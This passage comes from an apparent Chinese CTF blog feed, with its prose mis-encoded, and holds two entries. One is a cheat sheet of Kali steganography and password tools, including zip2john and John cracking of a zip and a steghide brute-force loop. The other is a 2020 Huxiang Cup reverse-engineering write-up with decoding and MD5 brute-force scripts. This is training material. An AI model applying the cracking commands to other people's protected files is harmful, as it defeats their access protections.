src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101537462.png" alt="image-20210810153757356"></p><h1 id="F5éšå†™-F5-steganography"><a href="#F5éšå†™-F5-steganography" class="headerlink" title="F5éšå†™ F5-steganography"></a>F5éšå†™ F5-steganography</h1><p>å®‰è£…</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matthewgao/F5-steganography</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract [æ–‡ä»¶å]</span><br></pre></td></tr></table></figure><p>ä¼šç”Ÿæˆä¸€ä¸ªoutput.txtæ–‡ä»¶</p><h1 id="kali-ä½¿ç”¨Johnç ´è§£zipå‹ç¼©åŒ…çš„å¯†ç "><a href="#kali-ä½¿ç”¨Johnç ´è§£zipå‹ç¼©åŒ…çš„å¯†ç " class="headerlink" title="kali ä½¿ç”¨Johnç ´è§£zipå‹ç¼©åŒ…çš„å¯†ç "></a>kali ä½¿ç”¨Johnç ´è§£zipå‹ç¼©åŒ…çš„å¯†ç </h1><p><strong>å‡†å¤‡å·¥å…·ï¼š</strong></p><ol><li>zipå‹ç¼©åŒ…å¸¦å¯†ç   1ä¸ª</li><li>kali Linuxæœºå™¨    1ä¸ª</li></ol><p><strong>æ“ä½œæ­¥éª¤ï¼š</strong></p><ol><li>é¦–å…ˆå°†å‹ç¼©åŒ…ä¸Šä¼ è‡³kaliæœºå™¨ï¼Œç„¶åä½¿ç”¨zip2johnå‘½ä»¤çˆ†å‡ºhashæ–‡ä»¶</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john license.zip &gt;&gt; passwd.txt</span><br></pre></td></tr></table></figure><p>ã€€2.ç„¶åä½¿ç”¨johnå‘½ä»¤ï¼Œè®¡ç®—hashæ–‡ä»¶</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john passwd.txt </span><br></pre></td></tr></table></figure><h1 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h1><p>å®‰è£…ä¸ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/crorvick/outguess</span><br><span class="line">cd outguess</span><br><span class="line">outguess -r /root/angrybird.jpg -t 11.txt</span><br><span class="line">outguess -k &#x27;abc&#x27; -r  mmm.jpg flag.txt</span><br></pre></td></tr></table></figure><h1 id="vmdkæ–‡ä»¶è§£å‹"><a href="#vmdkæ–‡ä»¶è§£å‹" class="headerlink" title="vmdkæ–‡ä»¶è§£å‹"></a>vmdkæ–‡ä»¶è§£å‹</h1><p>linuxä¸­</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x flag.vmdk -o./</span><br></pre></td></tr></table></figure><h1 id="éšå†™å·¥å…·Steghide"><a href="#éšå†™å·¥å…·Steghide" class="headerlink" title="éšå†™å·¥å…·Steghide"></a>éšå†™å·¥å…·Steghide</h1><p>Steghideæ˜¯ä¸€ä¸ªå¯ä»¥å°†æ–‡ä»¶éšè—åˆ°å›¾ç‰‡æˆ–éŸ³é¢‘ä¸­çš„å·¥å…·</p><p><strong>å®‰è£…ä¸ä½¿ç”¨</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install steghide</span><br><span class="line"></span><br><span class="line">steghide embed -cf [å›¾ç‰‡æ–‡ä»¶è½½ä½“] -ef [å¾…éšè—æ–‡ä»¶]</span><br><span class="line">steghide embed -cf 1.jpg -ef 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹å›¾ç‰‡ä¸­åµŒå…¥çš„æ–‡ä»¶ä¿¡æ¯</span><br><span class="line">steghide info 1.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥å¯†ç åå¯ä»¥çœ‹åˆ°åµŒå…¥çš„1.txt</span><br><span class="line">æå–å›¾ç‰‡ä¸­éšè—çš„æ–‡ä»¶</span><br><span class="line">steghide extract -sf 1.jpg</span><br></pre></td></tr></table></figure><p><strong>Steghideçˆ†ç ´å¯†ç ï¼š</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bruteStegHide.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> `cat <span class="variable">$2</span>`;<span class="keyword">do</span></span><br><span class="line">    steghide extract -sf <span class="variable">$1</span> -p <span class="variable">$line</span> &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">if</span> [[ $? -eq 0 ]];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;password is: &#x27;</span><span class="variable">$line</span></span><br><span class="line">        <span class="built_in">exit</span></span><br><span class="line">    <span class="keyword">fi</span>  </span><br><span class="line"><span class="keyword">done</span> </span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bruteStegHide.sh test.jpg passwd.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kaliå·¥å…·ä½¿ç”¨é›†åˆï¼ˆä¸»è¦é’ˆå¯¹misc-æŒç»­æ›´æ–°&quot;&gt;&lt;a href=&quot;#kaliå·¥å…·ä½¿ç”¨é›†åˆï¼ˆä¸»è¦é’ˆå¯¹misc-æŒç»­æ›´æ–°&quot; class=&quot;headerlink&quot; title=&quot;kaliå·¥å…·ä½¿ç”¨é›†åˆï¼ˆä¸»è¦é’ˆå¯¹misc æŒç»­æ›´æ–°&quot;&gt;&lt;/a&gt;kaliå·¥å…·ä½¿ç”¨é›†åˆï¼ˆä¸»è¦é’ˆ</summary>
      
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰</title>
    <link href="http://example.com/2021/08/13/2020%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%9B%98/"/>
    <id>http://example.com/2021/08/13/2020%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%9B%98/</id>
    <published>2021-08-13T11:39:43.626Z</published>
    <updated>2021-08-13T07:47:42.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰"><a href="#2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰" class="headerlink" title="2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰"></a>2020æ¹–æ¹˜æ¯å¤ç›˜ï¼ˆå¤§æ¦‚ï¼‰</h1><p>è¿˜æ˜¯ä¹å“¥ğŸ‚ğŸºå•Šï¼Œå·®ä¸€ç‚¹akï¼Œç”šè‡³æ‹¿åˆ°ä¸€è¡€ï¼ŒğŸ‘´å°±åªèƒ½åšåšç­¾åˆ°å¼‚æˆ–ï¼Œçœ‹çœ‹ç¥ä»™æ‰“æ¶ğŸ„â€â™‚ï¸ğŸ¤¸â€â™‚ï¸ğŸ¤º</p><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>è¿™é¢˜å•Šï¼Œç¡®å®ç®€å•ï¼Œä½†æ˜¯ğŸ‘´æ±‡ç¼–å¿˜äº†ä¸è¯´ï¼Œæ¯”èµ›ä¸­çŸ¥é“æ€è·¯ï¼Œä½†è¿˜æ˜¯å‚»å‚»çš„ä¸çŸ¥é“æ€ä¹ˆåšã€‚èµ›åä¹å“¥è®²çš„ODä¸­å¯ä»¥ç”¨ctrl+Gè·³åˆ°æŒ‡å®šåœ°å€æŸ¥çœ‹æ•°æ®ï¼ŒğŸ‘´æ‰æ˜ç™½ï¼Œä¸‹é¢æ¥çœ‹é¢˜</p><p>æ‹¿åˆ°ä¸€ä¸ªeasyre.exe</p><p>ç”¨exeinfopeåˆ†æå‘ç°æ²¡ğŸš</p><p>å…ˆæ¥è¿è¡Œçœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input your flag: 12344221331</span><br><span class="line">Wrong length</span><br></pre></td></tr></table></figure><p>å¾ˆç»å…¸å‘ï¼Œå¯¹æ¯”å­—ç¬¦ä¸²çš„é¢˜</p><p>è¿™ç§é¢˜åªè¦æ‰¾åˆ°å¯¹æ¯”å­—ç¬¦å’Œç®—æ³•å°±å¯ä»¥è§£å‡ºflagï¼ˆğŸ‘´è¿˜æ˜¯å¤ªğŸ¥—äº†ï¼‰</p><p>è¿™é¢˜ç”¨ODè°ƒè¯•</p><p>ğŸ”ä¸€ä¸‹å…³é”®å­—æ–­ç‚¹è°ƒè¯•ï¼Œå‘ç°äº†è¿ç®—æ–¹æ³•ï¼ŒåŒæ—¶çŸ¥é“å­—ç¬¦ä¸²é•¿åº¦ä¸º24</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150738.png" alt="image-20201106210414537"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shl eax,0x3     ;é€»è¾‘å·¦ç§»æŒ‡ä»¤ ç›¸å½“äº&lt;&lt; è¿™é‡Œå·¦ç§»äº†3ä½</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sar edx,0x5     ;é€»è¾‘å³ç§»æŒ‡ä»¤ ç›¸å½“äº&gt;&gt; è¿™é‡Œå³ç§»äº†5ä½</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or eax,edx      ;å°†è¿™ä¸¤ä¸ªå­—ç¬¦è¿›è¡Œæˆ–è¿ç®—</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor eax,dword ptr ss:[ebp-0xC] ;å°†åˆšåˆšçš„ç»“æœå¼‚æˆ–å½“å‰çš„å­—ç¬¦æ•°ç»„ä¸‹æ ‡</span><br></pre></td></tr></table></figure><p>å€Ÿæ­¤å¯ä»¥æ¨ç®—å‡ºä»£ç ä¸º <code>enflag[i] = ((flag[i]&lt;&lt;0x3)|(flag[(i+1)%24]&gt;&gt;0x5))^i</code></p><p>æ¥ç€è¿è¡Œè¿”å›åˆ°å¦ä¸€ä¸ªå‡½æ•°æ—¶å‘ç°å¯¹æ¯”å­—ç¬¦ä¸²çš„ä½ç½®</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150743.png" alt="image-20201106213104057"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">s = <span class="string">&quot;2B 08 A9 C8 97 2F FF 8C 92 F0 A3 89 F7 26 07 A4 DA EA B3 91 EF DC 95 AB&quot;</span></span><br><span class="line">s = s.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;0x&quot;</span> + i.lower(),end = <span class="string">&quot;,&quot;</span>)      </span><br><span class="line"><span class="comment">#0x2b,0x08,0xa9,0xc8,0x97,0x2f,0xff,0x8c,0x92,0xf0,0xa3,0x89,0xf7,0x26,0x07,0xa4,0xda,0xea,0xb3,0x91,0xef,0xdc,0x95,0xab</span></span><br></pre></td></tr></table></figure><p>4*6ä¹Ÿæ˜¯24é•¿åº¦ï¼Œä¸Šè„šæœ¬</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">26</span>] = &#123;<span class="number">0x2b</span>,<span class="number">0x08</span>,<span class="number">0xa9</span>,<span class="number">0xc8</span>,<span class="number">0x97</span>,<span class="number">0x2f</span>,<span class="number">0xff</span>,<span class="number">0x8c</span>,<span class="number">0x92</span>,<span class="number">0xf0</span>,<span class="number">0xa3</span>,<span class="number">0x89</span>,<span class="number">0xf7</span>,<span class="number">0x26</span>,<span class="number">0x07</span>,<span class="number">0xa4</span>,<span class="number">0xda</span>,<span class="number">0xea</span>,<span class="number">0xb3</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0xdc</span>,<span class="number">0x95</span>,<span class="number">0xab</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag = <span class="number">0</span>;</span><br><span class="line">flag = (a[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (a[<span class="number">23</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line">cout&lt;&lt;flag;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i&lt;<span class="number">23</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;((((a[i] ^ i) &gt;&gt; 3) | ((a[i-1] ^ (i-1)) &lt;&lt; 5))&amp;0xff)&lt;&lt;endl;</span></span><br><span class="line">    flag = ((((a[i] ^ i) &gt;&gt; <span class="number">3</span>) | ((a[i<span class="number">-1</span>] ^ (i<span class="number">-1</span>)) &lt;&lt; <span class="number">5</span>))&amp;<span class="number">0xff</span>);</span><br><span class="line">cout&lt;&lt;flag;</span><br><span class="line">&#125;</span><br><span class="line">flag = (a[<span class="number">23</span>] &gt;&gt; <span class="number">3</span>) | ((a[<span class="number">22</span>]^<span class="number">22</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line">cout&lt;&lt;flag;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="REMe"><a href="#REMe" class="headerlink" title="REMe"></a>REMe</h2><p>è¿™é¢˜å•Šï¼Œå›¾æ ‡å°±æ˜¯pythonç”Ÿæˆçš„exeæ–‡ä»¶ï¼ŒğŸ‘´é¢˜è¿˜æ˜¯åšå°‘äº†ï¼Œæ²¡è§è¿‡ã€‚æ¯”èµ›æ—¶ğŸ‘´ç”¨exeinfopeåˆ†æ</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150747.png" alt="image-20201107165231582"></p><p>å¥½åƒæ˜¯C++å†™çš„ï¼ˆè¢«éª—äº†ğŸ’”ï¼‰</p><p>åé¢å¥½åƒè¯´æœ‰ä¸€ä¸ªä»€ä¹ˆ.Zlibä¹‹ç±»çš„ä¸œè¥¿</p><p>ç›´æ¥æ‰“å¼€çœ‹çœ‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150750.png" alt="image-20201107165604303"></p><p>å¥½åƒä¹Ÿæ˜¯å¯¹æ¯”å­—ç¬¦ä¸²ä»€ä¹ˆçš„</p><p>ç”¨idaæ‰“å¼€çœ‹çœ‹â€¦â€¦</p><p>mian()ä¸­ä¸€å †å‡½æ•°è°ƒç”¨ğŸ¤·â€â™‚ï¸ï¼Œéƒ½çœ‹çœ‹ï¼Œæ„Ÿè§‰ä¸æ˜¯ç”¨idaæ‰“å¼€åæ±‡ç¼–çš„ï¼Œå¥½åƒæœ‰ä¸€äº›pythonçš„ç›¸å…³å­—ç¬¦ï¼ˆæ¯”èµ›æ—¶æ²¡ååº”è¿‡æ¥ğŸ¤ªï¼‰ï¼Œç›´æ¥å»ç™¾åº¦çœ‹çœ‹.Zlibæ˜¯ä»€ä¹ˆï¼Œæ˜¯ä»€ä¹ˆæ•°æ®å‹ç¼©çš„å‡½å¼åº“ï¼Œçœ‹ä¸æ‡‚å°±æ”¾ç€äº†ã€‚æ²¡æƒ³åˆ°ç«Ÿç„¶æ˜¯pythonåæ±‡ç¼–ï¼ˆğŸ€ç”Ÿäº†å‡ºæ¥ï¼‰</p><p>é‚£æ—¢ç„¶çŸ¥é“æ˜¯pythonç”Ÿæˆçš„exeï¼Œé‚£å°±æ˜¯ä¸€å¥—è€æ“ä½œ</p><p><code>python2 pyinstxtractor.py ReMe.exe</code>è§£åŒ…</p><p>åœ¨é‚£ä¹‹ä¸­æ‰¾åˆ°æœ€åƒçš„ ReMe.pyc</p><p>ç”¨<code>uncompyle6 -o re.py ReMe.pyc</code>è½¬æˆpy</p><p>pycè½¬pyå¤±è´¥ï¼Œç”¨å…¶ä»–çš„è¯•è¯•ï¼Œç”¨struct.pycåæ±‡ç¼–æˆpyæˆåŠŸäº†ğŸ™ƒ</p><p>çŒœæµ‹å¯èƒ½æ˜¯æ–‡ä»¶å¤´æŸåï¼Œç”¨struct.pycçš„æ–‡ä»¶å¤´åŠ ä¸Šå»</p><p>è¿™é‡Œæ·»åŠ ä¸€ä»½æ–‡ä»¶å¤´å¤§å…¨</p><h3 id="æ–‡ä»¶å¤´å¤§å…¨"><a href="#æ–‡ä»¶å¤´å¤§å…¨" class="headerlink" title="æ–‡ä»¶å¤´å¤§å…¨"></a>æ–‡ä»¶å¤´å¤§å…¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">jpg: FF D8 FF</span><br><span class="line">png: <span class="number">89</span> <span class="number">50</span> 4E <span class="number">47</span></span><br><span class="line">gif: <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span></span><br><span class="line">bmp: <span class="number">42</span> 4D</span><br><span class="line">pyc: 03 F3 0D 0A</span><br><span class="line">pyd: 4D 5A <span class="number">90</span> <span class="number">00</span></span><br><span class="line"><span class="built_in">zip</span>: <span class="number">50</span> 4B 03 04 <span class="comment">#asciiç éƒ¨åˆ†æ˜¯PKï¼Œå¯ä»¥ç›´æ¥æ ¹æ®PKåˆ¤æ–­æ˜¯zipæ–‡ä»¶ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯docæ–‡ä»¶</span></span><br><span class="line">rar: <span class="number">52</span> <span class="number">61</span> <span class="number">72</span> <span class="number">21</span></span><br><span class="line">7z: <span class="number">37</span> 7A BC AF <span class="number">27</span> 1C</span><br><span class="line">xls/doc: D0 CF <span class="number">11</span> E0</span><br><span class="line">dwg: <span class="number">41</span> <span class="number">43</span> <span class="number">31</span> <span class="number">30</span></span><br><span class="line">psd: <span class="number">38</span> <span class="number">42</span> <span class="number">50</span> <span class="number">53</span></span><br><span class="line">rtf: 7B 5C <span class="number">72</span> <span class="number">74</span> <span class="number">66</span></span><br><span class="line">xml: 3C 3F <span class="number">78</span> 6D 6C</span><br><span class="line">html: <span class="number">68</span> <span class="number">74</span> 6D 6C 3E</span><br><span class="line">eml: <span class="number">44</span> <span class="number">65</span> 6C <span class="number">69</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">79</span> 2D <span class="number">64</span> <span class="number">61</span> <span class="number">74</span> <span class="number">65</span> 3A</span><br><span class="line">dbx: CF AD <span class="number">12</span> FE C5 FD <span class="number">74</span> 6F</span><br><span class="line">pst: <span class="number">21</span> <span class="number">42</span> <span class="number">44</span> 4E</span><br><span class="line">mdb: <span class="number">53</span> <span class="number">74</span> <span class="number">61</span> 6E <span class="number">64</span> <span class="number">61</span> <span class="number">72</span> <span class="number">64</span> <span class="number">20</span> 4A</span><br><span class="line">wpd: FF <span class="number">57</span> <span class="number">50</span> <span class="number">43</span></span><br><span class="line">eps/ps: <span class="number">25</span> <span class="number">21</span> <span class="number">50</span> <span class="number">53</span> 2D <span class="number">41</span> <span class="number">64</span> 6F <span class="number">62</span> <span class="number">65</span></span><br><span class="line">pdf: <span class="number">25</span> <span class="number">50</span> <span class="number">44</span> <span class="number">46</span> 2D <span class="number">31</span> 2E</span><br><span class="line">qdf: AC 9E BD 8F</span><br><span class="line">pwl: E3 <span class="number">82</span> <span class="number">85</span> <span class="number">96</span></span><br><span class="line">wav: <span class="number">57</span> <span class="number">41</span> <span class="number">56</span> <span class="number">45</span></span><br><span class="line">avi: <span class="number">41</span> <span class="number">56</span> <span class="number">49</span> <span class="number">20</span></span><br><span class="line">ram: 2E <span class="number">72</span> <span class="number">61</span> FD</span><br><span class="line">rm: 2E <span class="number">52</span> 4D <span class="number">46</span></span><br><span class="line">mpg: <span class="number">00</span> <span class="number">00</span> 01 BA <span class="keyword">or</span> <span class="number">00</span> <span class="number">00</span> 01 B3</span><br><span class="line">mov: 6D 6F 6F <span class="number">76</span></span><br><span class="line">asf: <span class="number">30</span> <span class="number">26</span> B2 <span class="number">75</span> 8E <span class="number">66</span> CF <span class="number">11</span></span><br><span class="line">mid: 4D <span class="number">54</span> <span class="number">68</span> <span class="number">64</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000h: 42 0D 0D 0A 00 00 00 00 70 79 69 30 10 01 00 00 ; B.......pyi0....</span><br></pre></td></tr></table></figure><p>è¦†ç›–ç¬¬ä¸€è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000010h: 03 F3 0D 0A 00 00 00 00 00 00 00 00 00 00 00 00 ; .?.............</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥åæ±‡ç¼–äº†ï¼Œå‘ç°ä»£ç æ˜¯å°†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦é€ä¸ªè¿ç®—å’Œä¸€å †md5æ¯”è¾ƒã€‚</p><p>é‚£å°±ä»32~127é€ä¸ªæšä¸¾æ¯”å¯¹å†™å‡ºpythonæš´åŠ›è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys, hashlib</span><br><span class="line">check = [</span><br><span class="line"> <span class="string">&#x27;e5438e78ec1de10a2693f9cffb930d23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;08e8e8855af8ea652df54845d21b9d67&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;a905095f0d801abd5865d649a646b397&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bac8510b0902185146c838cdf8ead8e0&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f26f009a6dc171e0ca7a4a770fecd326&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;4cb467175ab6763a9867b9ed694a2780&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fd311e9877c3db59027597352999e91f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;7fb523b42413495cc4e610456d1f1c84&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bc52c927138231e29e0b05419e741902&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;515b7eceeb8f22b53575afec4123e878&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;451660d67c64da6de6fadc66079e1d8a&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fe86104ce1853cb140b7ec0412d93837&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c2bab7ea31577b955e2c2cac680fb2f4&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f077b3a47c09b44d7077877a5aff3699&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;620741f57e7fafe43216d6aa51666f1d&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;9e3b206e50925792c3234036de6a25ab&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;874992ac91866ce1430687aa9f7121fc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">num</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span 